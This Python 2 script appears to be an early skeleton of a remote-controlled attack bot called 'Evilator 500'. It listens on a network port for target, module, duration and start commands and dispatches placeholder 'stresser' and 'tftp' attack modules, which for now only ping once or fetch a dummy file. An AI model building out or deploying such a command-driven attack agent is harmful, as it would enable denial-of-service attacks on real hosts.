#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import os
import sys
import time
import thread
import random
import logging
import ConfigParser

from time import localtime, gmtime, strftime

# Functions...

def logi(my_info):
    if global_debug == True:
        print my_info
    logging.info(my_info)

def loge(my_error):
    if global_debug == True:
        print my_error
    logging.error(my_error)

def time_zeile(worker_id):
    zeitstempel = strftime("%Y-%d-%m %H:%M:%S", localtime())
    if worker_id > 0:
        zeile = "[ " + zeitstempel + " ] worker_id " + str(worker_id) + " "
    else:
        zeile = "[ " + zeitstempel + " ] *** MAIN *** "
    return (zeile)

def m_stresser(my_target, my_duration):
    # Ignore Duration for now
    logi(os.system("ping -c 1 %s" % my_target))

def m_tftp(my_target, my_duration):
    # Ignore Duration for now
    logi(os.system("tftp -m bin %s -c GET some_random.file" %(my_target)))

def start_attack(my_target, my_module, my_duration):
    try:
        socket.inet_aton(my_target)
        # legal
    except socket.error:
        my_target = "127.0.0.1"

    if int(my_duration) < 1 or int(my_duration) > 15:
        my_duration = 3
    else:
        my_duration = int(my_duration)

    if my_module == "stresser":
        m_stresser(my_target, my_duration)
    elif my_module == "tftp":
        m_tftp(my_target, my_duration)
    else:
        pass

def random_high_port():
    return random.randint(1024, 65535)

def quit_gracefully():
    # If such a thing is possible
    # which, basically it isn't
    worker_id = 0
    my_info = time_zeile(worker_id) + "End of program "
    logi(my_info)
    quit()

def bot_loop(c, bot_cmd, bot_param, target, module, duration):
    # What does master want from poor old Dobbie?
    global bot_service
    worker_id = 9

    StillAlive = True

    if target != "":
        my_target = target
    else:
        my_target = ""

    if module != "":
        my_module = module
    else:
        my_module = ""

    if int(duration) > 0:
        my_duration = duration
    else:
        my_duration = 0

    if bot_cmd == "target":
        my_target = bot_param
        c.send(bot_service + " TARGET %s\n" % (my_target))
        my_info = time_zeile(worker_id) + "Target has been set to %s" % (my_target)
        logi(my_info)

    elif bot_cmd == "mod" or bot_cmd == "module":
        my_module = bot_param
        c.send(bot_service + " MODULE %s\n" % (my_module))
        my_info = time_zeile(worker_id) + "Module has been set to %s" % (my_module)
        logi(my_info)
    elif bot_cmd == "dur" or bot_cmd == "duration":
        my_duration = bot_param
        c.send(bot_service + " DURATION %s\n" % (my_duration))
        my_info = time_zeile(worker_id) + "Duration has been set to %s" % (my_duration)
        logi(my_info)
    elif bot_cmd == "now" or bot_cmd == "start":
        if my_target != "" and my_module != "" and my_duration != "":
            my_info = time_zeile(worker_id) + "Starting attack (tgt %s mod %s dur %s)" % (my_target, my_module, my_duration)
            logi(my_info)
            #thread.start_new_thread(start_attack, (my_target, my_module, my_duration ) )
            start_attack(my_target, my_module, my_duration)
            c.send(bot_service + " STARTING...\n")
            # in einem thread bitte start_attack(my_target, my_module, my_duration)
        else:
            my_error = time_zeile(worker_id) + "Insufficent parameters:\nTarget: %s\nModule: %s\nDuration: %s" % (my_target, my_module, my_duration)
            loge(my_error)
            c.send(bot_service + " Insufficent parameters:\nTarget: %s\nModule: %s\nDuration: %s" % (my_target, my_module, my_duration))
    elif bot_cmd == "quit" or bot_cmd == "bye" or bot_cmd == "exit":
        StillAlive = False
        c.close()
        # I should do something with this, disconnect etc
    else:
        my_info = time_zeile(worker_id) + "CMD %s not understood" % (bot_cmd)
        logi(my_info)

    #return ("AAARGH", "QUAAAAL", 3)
    return StillAlive, my_target, my_module, my_duration


#def port_open(my_port, worker_id):
def port_open(my_port):
    worker_id = 9

    s = socket.socket()
    #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        s.bind(("0.0.0.0", my_port))
        my_info = time_zeile(worker_id) + "Listening on all interfaces, port %d" % (int(my_port))
        logi(my_info)
    except IOError as e:
        my_info = time_zeile(worker_id) + "I/O error({0}): {1} [worker {2}]".format(e.errno, e.strerror, worker_id)
        logi(my_info)
        quit_gracefully()

    return(s)

#def port_listen(my_port, my_socket, worker_id):
def port_listen(my_port, my_socket):
    StayAlive = True
    global ConnectionMaxTime
    global bot_service

    worker_id = 9

    while (StayAlive == True):
        my_info = time_zeile(worker_id) + "pre-listen..."
        logi(my_info)

        my_socket.listen(5)     # Queue max 5 connections
        my_info = time_zeile(worker_id) + "...post-listen"
        logi(my_info)

        try:
            my_info = time_zeile(worker_id) + "pre-accept..."
            logi(my_info)
            c, addr = my_socket.accept()

            try:
                c.settimeout(60)
            except:
                print "Did not work"

            my_info = time_zeile(worker_id) + "...post-accept"
            logi(my_info)

            my_info = time_zeile(worker_id) + "Connection from: " + str(addr)
            logi(my_info)

        except IOError as e:

            my_error = time_zeile(worker_id) + "I/O error({0}): {1}".format(e.errno, e.strerror)
            loge(my_error)
            StayAlive = False
            quit_gracefully()


        ConnectionAlive = True
        t0 = time.time()

        c.send(bot_service + " LISTENING\n")

        my_info = time_zeile(worker_id) + "Ticks start at " + str(t0)
        logi(my_info)

        target = ""
        module = ""
        duration = 0

        while (ConnectionAlive == True):
            try:
                my_info = time_zeile(worker_id) + "waiting for data..."
                logi(my_info)

                data = c.recv(1024) # Hmm.. Buffer size.. could be breached

                my_info = time_zeile(worker_id) + "Data received"
                logi(my_info)

            except IOError as e:
                my_error = time_zeile(worker_id) + "I/O error({0}): {1}".format(e.errno, e.strerror)
                loge(my_error)
                my_error = time_zeile(worker_id) + "Closed or other error"
                loge(my_error)

                ConnectionAlive = False
                StayAlive = False
                c.close()
                quit_gracefully()

            # Did we get anything interesting?

            try:
                daten = str(data.strip())
            except UnboundLocalError:
                daten = time_zeile(worker_id) + "No data received."

            my_info = time_zeile(worker_id) + "received data: " + daten
            logi(my_info)

            split_daten = daten.split(' ',1)

            try:
                bot_cmd = split_daten[0]
            except IndexError:
                bot_cmd = "quit"

            try:
                bot_param = split_daten[1]
            except IndexError:
                bot_param = "now"

            bot_cmd = bot_cmd.lower()

            ConnectionAlive = False
            ConnectionAlive, mtarget, mmodule, mduration = bot_loop(c, bot_cmd, bot_param, target, module, duration)

            target = mtarget
            module = mmodule
            duration = mduration




bot_service = "Evilator 500"


# Read config file
# The config file should be in the same directory as the python script
# It's name is hardcoded for now, can become a command-line parameter

my_config = ConfigParser.ConfigParser()
my_config.read("./mcp.cfg")

# Start logging
# Right now, we're logging into a file and print everything on screen. Disable next global if you'd like to omit screen output.

logging.basicConfig(filename="./mcp.log", level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")
logging.debug("Start of program mcp.py")


# General section
try:
    ConnectionMaxTime = my_config.get("General", "ConnectionMaxTime")
    if (int(ConnectionMaxTime) < 1 or int(ConnectionMaxTime) > 300):
        ConnectionMaxTime = 60 #default
except:
    ConnectionMaxTime = 60 #default
    print "Couldn't read ConnectionMaxTime from config"
    logging.error("Couldn't read ConnectionMaxTime from config")

try:
    PortNumber = my_config.get("General", "PortNumber")
    if (int(PortNumber) < 1024 or int(PortNumber) > 65535):
        PortNumber = 20050 #default
except:
    PortNumber = 20050
    print "Couldn't read PortNumber from config"
    logging.error("Couldn't read PortNumber from config")

try:
    MaxConnections = my_config.get("General", "MaxConnections")
    if (int(MaxConnections) < 1 or int(MaxConnections) > 5):
        MaxConnections = 3 #default
except:
    MaxConnections = 3
    print "Couldn't read MaxConnections from config"
    logging.error("Couldn't read MaxConnections from config")

#ConnectionMaxTime = 20
#PortNumber = 20050
#MaxConnections = 3

ConnectionAttempts = 0
StayAlive = True
StillRunningTimer = 30

# functions

global_ende = 0
global_threads_max = 2
global_debug = True





#print "Global Ende = " + str(global_ende)

try:
    if int(PortNumber) > 1023 and int(PortNumber) < 65535:
        my_port = int(PortNumber)
    else:
        my_port = 20050
    retval = True
    while (retval == True):
        #retval = thread.start_new_thread( open_and_listen, (my_port, 1, ) )
        my_info = time_zeile(0) + "Port " + str(my_port) + " opened."
        logi(my_info)
        #my_socket = thread.start_new_thread( port_open, (my_port, 1, ) )
        my_socket = port_open(my_port)

        # thread.start_new_thread( port_listen, (my_port, s, 1 ))
        my_info = time_zeile(0) + "Port " + str(my_port) + " starts listening."
        logi(my_info)
        port_listen(my_port, my_socket)

except:
    my_error = time_zeile(0) + "Error: unable to do stuff (was: start thread)"
    loge(my_error)

#while (global_ende < global_threads_max) :#
    #time.sleep(StillRunningTimer)
    #print time_zeile(0) + "Still alive ----------------  " + str(global_ende) + " exited, max " + str(global_threads_max) + "  -----"
#else:
#    print time_zeile(0) + "All threads have finished their jobs, exiting... "
